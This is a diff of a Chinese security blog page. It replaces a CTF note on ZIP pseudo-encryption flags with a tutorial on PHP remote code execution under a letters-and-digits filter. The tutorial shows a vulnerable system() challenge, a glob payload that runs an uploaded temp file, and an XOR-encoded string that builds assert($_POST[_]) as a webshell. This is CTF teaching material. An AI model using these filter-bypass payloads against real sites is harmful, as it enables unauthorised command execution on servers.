@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ZIP伪加密, Hbluewhite的Blog">
+    <meta name="keywords" content="RCE无字母数字总结, Hbluewhite的Blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ZIP伪加密 | Hbluewhite的Blog</title>
+    <title>RCE无字母数字总结 | Hbluewhite的Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -356,12 +356,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ZIP伪加密</h1>
+                    <h1 class="description center-align post-title">RCE无字母数字总结</h1>
                 </div>
             </div>
         </div>
@@ -477,8 +477,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Misc/">
-                                <span class="chip bg-color">Misc</span>
+                            <a href="/tags/Web-bug/">
+                                <span class="chip bg-color">Web bug</span>
                             </a>
                         
                     </div>
@@ -514,21 +514,29 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><p>zip伪造加密，首先我们要先知道，压缩包的各个部分</p>
-<p><strong>压缩源文件数据区：</strong><br>50 4B 03 04：这是头文件标记（0x04034b50）<br> 14 00：解压文件所需 pkware 版本<br> 00 00：全局方式位标记（有无加密） 头文件标记后2bytes<br> 08 00：压缩方式<br> 5A 7E：最后修改文件时间<br> F7 46：最后修改文件日期<br> 16 B5 80 14：CRC-32校验（1480B516）<br> 19 00 00 00：压缩后尺寸（25）<br> 17 00 00 00：未压缩尺寸（23）<br> 07 00：文件名长度<br> 00 00：扩展记录长度<br> 6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500<br><strong>压缩源文件目录区：</strong> </p>
-<p>50 4B 01 02：目录中文件文件头标记(0x02014b50) </p>
-<p>3F 00：压缩使用的 pkware 版本</p>
-<p>14 00：解压文件所需 pkware 版本<br> 00 00：全局方式位标记（有无加密，伪加密的关键） 目录文件标记后4bytes<br> 08 00：压缩方式<br> 5A 7E：最后修改文件时间<br> F7 46：最后修改文件日期<br> 16 B5 80 14：CRC-32校验（1480B516）<br> 19 00 00 00：压缩后尺寸（25）<br> 17 00 00 00：未压缩尺寸（23）<br> 07 00：文件名长度<br> 24 00：扩展字段长度<br> 00 00：文件注释长度<br> 00 00：磁盘开始号<br> 00 00：内部文件属性<br> 20 00 00 00：外部文件属性 </p>
-<p>00 00 00 00：局部头部偏移量</p>
-<p>6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001<br><strong>压缩源文件目录结束标志：</strong><br> 50 4B 05 06：目录结束标记<br> 00 00：当前磁盘编号<br> 00 00：目录区开始磁盘编号<br> 01 00：本磁盘上纪录总数<br> 01 00：目录区中纪录总数<br> 59 00 00 00：目录区尺寸大小 </p>
-<p>3E 00 00 00：目录区对第一张磁盘的偏移量</p>
-<p>00 00：ZIP 文件注释长度</p>
-<p> 这个详细的介绍了各部分的含义，修改其压缩源文件目录区的全布局方式标记比特值之后即可对文件加密或解密。</p>
-<h2 id="真加密与伪加密"><a href="#真加密与伪加密" class="headerlink" title="真加密与伪加密"></a>真加密与伪加密</h2><p>其实上面也说了真加密和伪加密容易出现的位置，首先压缩文件数字区中全局变量中00是否为90，这里是判断加密的条件之一，但是当压缩文件数字区为90时，压缩文件目录区应该也为90</p>
-<p>题目中很容易出现，压缩文字目录区为90，而压缩文字数字区为00，这种情况也就是伪加密，所以当我们遇到这种情况要按照相应的位置进行修改。</p>
-<h3 id="无加密"><a href="#无加密" class="headerlink" title="无加密"></a>无加密</h3><p>压缩源文件数据区的全局加密应当为<code>00 00</code> （504B0304两个bytes之后）<br> 且压缩源文件目录区的全局方式位标记应当为<code>00 00</code>（504B0304四个bytes之后）</p>
-<h3 id="假加密"><a href="#假加密" class="headerlink" title="假加密"></a>假加密</h3><p>压缩源文件数据区的全局加密应当为<code>00 00</code><br> 且压缩源文件目录区的全局方式位标记应当为<code>09 00</code></p>
-<h3 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h3><p>压缩源文件数据区的全局加密应当为<code>09 00</code><br> 且压缩源文件目录区的全局方式位标记应当为<code>09 00</code> </p>
+                <h1 id="RCE-无数字和字母总结"><a href="#RCE-无数字和字母总结" class="headerlink" title="RCE 无数字和字母总结"></a>RCE 无数字和字母总结</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">  $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">  if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c)) &#123;</span><br><span class="line">    system($c);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目一般是这样的，我们可以看到preg_match()函数对传入的字母以及数字进行了过滤，我们可以用以下几种方式来进行过滤。</p>
+<h2 id="1-构造数据包"><a href="#1-构造数据包" class="headerlink" title="1. 构造数据包"></a>1. 构造数据包</h2><p>首先我们大概思路是这样的，我们的get传参的数据既然被过滤掉了，我们可以通过post文件，在上传的过程中，通过<code>。</code>去执行这个文件。</p>
+<p><strong>通过.去执行的文件是不需要有执行权限的</strong></p>
+<p>数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后bp抓包。</p>
+<p>然后再文件中构造一个<code> ?c=.+/???/????????[@-[]</code></p>
+<p>用到Linux下的glob通道符：</p>
+<p><img src="https://img-blog.csdnimg.cn/20201101200709838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>介绍一下bin目录:</p>
+<p>bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等，也就是一些系统命令都在bin 目录下</p>
+<p>在这里再解释一下为什么加上#！ #!的意思是调用 /bin/sh 命令所以需要加</p>
+<p><img src="https://img-blog.csdnimg.cn/20201101200430332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>然后就可以使用#!调用bin/sh命令绕过数字和字母了。</p>
+<h2 id="2-取反"><a href="#2-取反" class="headerlink" title="2.取反"></a>2.取反</h2><ol>
+<li>php中对汉字可以去乱码，但大多数包含一个字母，我们可以通过这种话方法获得字母。</li>
+</ol>
+<h2 id="3-异或"><a href="#3-异或" class="headerlink" title="3. 异或"></a>3. 异或</h2><p>当过滤掉字母和数字时，我们可以通过异或来取字母大概啥这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a:&#x27;%40&#x27;^&#x27;%21&#x27; ; s:&#x27;%7B&#x27;^&#x27;%08&#x27; ; s:&#x27;%7B&#x27;^&#x27;%08&#x27; ; e:&#x27;%7B&#x27;^&#x27;%1E&#x27; ; r:&#x27;%7E&#x27;^&#x27;%0C&#x27; ; t:&#x27;%7C&#x27;^&#x27;%08&#x27;</span><br><span class="line">P:&#x27;%0D&#x27;^&#x27;%5D&#x27; ; O:&#x27;%0F&#x27;^&#x27;%40&#x27; ; S:&#x27;%0E&#x27;^&#x27;%5D&#x27; ; T:&#x27;%0B&#x27;^&#x27;%5F&#x27;</span><br><span class="line">拼接起来：</span><br><span class="line">$_=(&#x27;%40&#x27;^&#x27;%21&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%1E&#x27;).(&#x27;%7E&#x27;^&#x27;%0C&#x27;).(&#x27;%7C&#x27;^&#x27;%08&#x27;);  // $_=assert</span><br><span class="line">$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;%5D&#x27;).(&#x27;%0F&#x27;^&#x27;%40&#x27;).(&#x27;%0E&#x27;^&#x27;%5D&#x27;).(&#x27;%0B&#x27;^&#x27;%5F&#x27;);  // $__=_POST</span><br><span class="line">$___=$$__; //$___=$_POST</span><br><span class="line">$_($___[_]);//assert($_POST[_]);</span><br><span class="line">放到一排就是：</span><br><span class="line">$_=(&#x27;%40&#x27;^&#x27;%21&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%1E&#x27;).(&#x27;%7E&#x27;^&#x27;%0C&#x27;).(&#x27;%7C&#x27;^&#x27;%08&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;%5D&#x27;).(&#x27;%0F&#x27;^&#x27;%40&#x27;).(&#x27;%0E&#x27;^&#x27;%5D&#x27;).(&#x27;%0B&#x27;^&#x27;%5F&#x27;);$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>
+
 
                 
             </div>
@@ -555,7 +563,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/10/28/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/">http://example.com/2021/10/28/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</a>
+                    <a href="http://example.com/2021/10/28/RCE%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%80%BB%E7%BB%93/">http://example.com/2021/10/28/RCE%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%80%BB%E7%BB%93/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -593,8 +601,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Misc/">
-                                    <span class="chip bg-color">Misc</span>
+                                <a href="/tags/Web-bug/">
+                                    <span class="chip bg-color">Web bug</span>
                                 </a>
                             
                         </div>
@@ -1032,9 +1040,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/10/28/RCE%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%80%BB%E7%BB%93/">
                     <div class="card-image">
@@ -1052,9 +1061,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-28
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-28
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1063,6 +1072,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1081,13 +1091,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88phar-%EF%BC%89/">
+                <a href="/2021/10/28/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.png" class="responsive-img" alt="php反序列化（phar://）">
+                        <img src="/medias/featureimages/15.png" class="responsive-img" alt="ZIP伪加密">
                         
-                        <span class="card-title">php反序列化（phar://）</span>
+                        <span class="card-title">ZIP伪加密</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1098,7 +1108,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-28
                             </span>
                         <span class="publish-author">
                             
@@ -1111,8 +1121,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/php/">
-                        <span class="chip bg-color">php</span>
+                    <a href="/tags/Misc/">
+                        <span class="chip bg-color">Misc</span>
                     </a>
                     
                 </div>
